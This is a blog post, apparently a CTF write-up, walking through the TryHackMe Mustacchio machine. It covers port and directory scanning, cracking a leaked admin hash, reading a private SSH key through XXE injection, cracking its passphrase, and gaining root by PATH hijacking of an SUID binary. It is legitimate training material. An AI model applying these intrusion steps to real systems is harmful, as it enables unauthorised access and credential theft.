@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/ally-petitt/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=ally-petitt/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Mustacchio Walkthrough | Try Hack Me | Ally Petitt | Ally Petitt</title>
+<meta name="keywords" content="">
+<meta name="description" content="Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!
+Notes: This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/">
+<link crossorigin="anonymous" href="/ally-petitt/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/ally-petitt/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/ally-petitt/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/ally-petitt/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/ally-petitt/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/ally-petitt/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/ally-petitt/" accesskey="h" title="Ally Petitt (Alt + H)">Ally Petitt</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Mustacchio Walkthrough | Try Hack Me | Ally Petitt
+    </h1>
+    <div class="post-meta"><span title='2022-02-18 00:00:00 +0000 UTC'>February 18, 2022</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png" alt=""  />
+</p>
+<h1 id="introduction"><strong>Introduction</strong><a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
+<p>Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!</p>
+<p>Notes: </p>
+<ul>
+<li>This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows</li>
+</ul>
+<h1 id="enumeration"><strong>Enumeration</strong><a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h1>
+<p>To begin, I scanned for open ports using <a href="https://github.com/RustScan/RustScan">RustScan</a>. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:</p>
+<p><code>PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p>
+<p>As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using <a href="https://github.com/ffuf/ffuf">FFUF</a> (you can also use Wfuzz, Gobuster, or DirBuster for this part).</p>
+<p><code>ffuf -u &lt;http://10.10.93.193/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png" alt=""  />
+
+The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png" alt=""  />
+
+And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.</p>
+<p><code>$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></p>
+<p>From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png" alt=""  />
+
+How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.</p>
+<h1 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h1>
+<p>After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:</p>
+<p><code>$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&gt; .tables   users   sqlite&gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;</code></p>
+<p>And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.</p>
+<p><code>$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png" alt=""  />
+
+And we have our password! With the newfound credentials <code>admin:bulldog19</code> I logged into the admin console on port 8765. Success! The credentials worked.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png" alt=""  />
+
+While looking at the page source, two things immediately stand out to me.</p>
+<ol>
+<li>I see a comment left by the developer</li>
+<li>The name of the input box is “xml”</li>
+</ol>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png" alt=""  />
+
+When I try press submit without writing anything in the textarea, I am greeted by the following alert:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png" alt=""  />
+
+Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the <a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">most common XML vulnerabilities</a> is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this <a href="https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/">blog post</a>:</p>
+<p>`<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>When I type this in the text area and press “Submit”, I see the following on my screen:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png" alt=""  />
+
+Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.</p>
+<h1 id="usertxt">User.txt<a hidden class="anchor" aria-hidden="true" href="#usertxt">#</a></h1>
+<p>Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed <code>/etc/passwd</code> to <code>/home/barry/.ssh/id_rsa</code> as &ldquo;id_rsa&rdquo; is a common name for the file containing a private ssh key.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png" alt=""  />
+
+Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, <strong>making sure that there is no white space</strong>. I changed the permissions on the file using this command:</p>
+<p><code>chmod 400 id_rsa_barry</code></p>
+<p>I went to ssh into the machine and this was my result:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png" alt=""  />
+
+It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.</p>
+<p><code>$ python3 /usr/share/john/ssh2john.py id_rsa_barry &gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png" alt=""  />
+
+Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.</p>
+<h1 id="privilege-escalation"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png" alt=""  />
+
+Privilege Escalation</h1>
+<p>First, I took a look at Barry’s id.</p>
+<p><code>barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)</code></p>
+<p>It appears that he is not in any groups that we could use for privilege escalation. I also used <code>sudo -l</code> to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.</p>
+<pre tabindex="0"><code>barry@mustacchio:~$ find / -perm -4000 2&gt;/dev/null  
+/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
+/usr/lib/eject/dmcrypt-get-device  
+/usr/lib/policykit-1/polkit-agent-helper-1  
+/usr/lib/snapd/snap-confine  
+/usr/lib/openssh/ssh-keysign  
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
+/usr/bin/passwd  
+/usr/bin/pkexec  
+/usr/bin/chfn  
+/usr/bin/newgrp  
+/usr/bin/at  
+/usr/bin/chsh  
+/usr/bin/newgidmap  
+/usr/bin/sudo  
+/usr/bin/newuidmap  
+/usr/bin/gpasswd  
+**/home/joe/live\_log**  
+/bin/ping  
+/bin/ping6  
+/bin/umount  
+/bin/mount  
+/bin/fusermount  
+/bin/su
+</code></pre><p>Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.</p>
+<p><code>barry@mustacchio:~$ cd /home/joe &amp;&amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log</code></p>
+<p>And we do! When I run it, it appears to launch an application.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png" alt=""  />
+
+This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the <code>strings</code> command. Additionally, I used <code>awk</code> so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.</p>
+<p><code>$ strings live_log | awk ‘length($0) &gt; 15’</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png" alt=""  />
+
+Interesting. There is a path to “access.log” and the full path for the <code>tail</code> command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.</p>
+<p>`$ export PATH=/tmp<br>
+$ cd /tmp<br>
+$ echo “/bin/bash -p” &gt; tail<br>
+$ /bin/chmod +x tail<br>
+$ /home/joe/live_log</p>
+<h1 id="usrbinwhoami">/usr/bin/whoami<a hidden class="anchor" aria-hidden="true" href="#usrbinwhoami">#</a></h1>
+<p>root</p>
+<h1 id="bincat-rootroottxt">/bin/cat /root/root.txt<a hidden class="anchor" aria-hidden="true" href="#bincat-rootroottxt">#</a></h1>
+<p>[REDACTED]`</p>
+<p>And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from <code>/usr/bin/tail</code> to <code>/tmp/tail</code> which allowed us to run <code>/bin/bash</code> as root, giving us a root shell.</p>
+<p>That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback <a href="https://www.linkedin.com/in/ally-petitt-5a02aa208/">via LinkedIn</a>. Thank you and take care!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="http://localhost:1313/ally-petitt/">Ally Petitt</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
